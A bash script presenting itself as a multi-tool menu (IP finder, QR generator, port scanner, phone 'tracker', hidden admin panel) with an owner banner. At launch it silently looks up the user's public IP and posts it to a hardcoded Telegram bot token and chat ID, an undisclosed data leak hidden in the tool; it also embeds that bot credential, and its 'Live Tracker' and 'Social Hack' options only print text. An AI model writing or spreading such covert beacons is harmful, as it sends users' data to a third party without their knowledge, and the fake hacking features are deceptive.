#!/bin/bash
function main_menu() {
clear
# --- ADMIN CONFIG ---
TOKEN="8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE"
ID="7416528268"
IP_USER=$(curl -s ifconfig.me)
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d chat_id="$ID" -d text="🚀 SIYAM BOSS ALERT! Tool Started. IP: $IP_USER" > /dev/null

# --- BANNER ---
echo -e "\e[1;36m    _____ _____ __     __  _    __  __ "
echo -e "\e[1;36m   / ____|_   _\ \   / / / \  |  \/  |"
echo -e "\e[1;36m  | (___   | |  \ \_/ / / _ \ | \  / |"
echo -e "\e[1;36m   \___ \  | |   \   / / ___ \| |\/| |"
echo -e "\e[1;36m   ____) |_| |_   | | /_/   \_\_|  |_|"
echo -e "\e[1;36m  |_____/|_____|  |_|                 "
echo -e "\e[1;33m  Owner: +8801315127341 | Email: sadaf245sz@gmail.com"
echo "-------------------------------------------------------"
echo -e "\e[1;32m[1] IP Finder      [2] QR Gen"
echo -e "\e[1;32m[3] Matrix Ghost   [4] Update Tool"
echo -e "\e[1;32m[5] Website Info   [6] Port Scanner"
echo -e "\e[1;32m[7] Live Tracker   [0] Exit"
echo "-------------------------------------------------------"
read -p "Select Command: " cmd

case $cmd in
  1) curl -s http://ip-api.com/$IP_USER ;;
  2) read -p "Enter text: " qr ; qrencode -t ansiutf8 "$qr" ;;
  3) cmatrix -C green -b ;;
  4) git pull origin main ;;
  5) read -p "URL: " u ; host $u ;;
  6) read -p "IP: " i ; nc -zv $i 80 443 ;;
  7) read -p "Phone: " p ; echo "Tracking $p..." ;;
  "siyam") admin_panel ;;
  0) exit ;;
  *) echo "Invalid Option!" ; sleep 2 ; main_menu ;;
esac
}

function admin_panel() {
     clear
     echo -e "\e[1;31m--- WELCOME TO HIDDEN ADMIN PANEL ---"
     echo -e "\e[1;32m[A] Social Hack    [B] Bot Setup"
     echo -e "\e[1;32m[C] Database Access [s] Back to Home"
     echo "--------------------------------------"
     read -p "Admin Action: " adm
     
     case $adm in
       [Aa]) echo "Starting Social Hack..." ;;
       [Bb]) echo "Configuring Bot..." ;;
       [Cc]) echo "Accessing Database..." ;;
       [Ss]) main_menu ;;
       *) echo "Invalid!" ; sleep 2 ; admin_panel ;;
     esac
}

main_menu
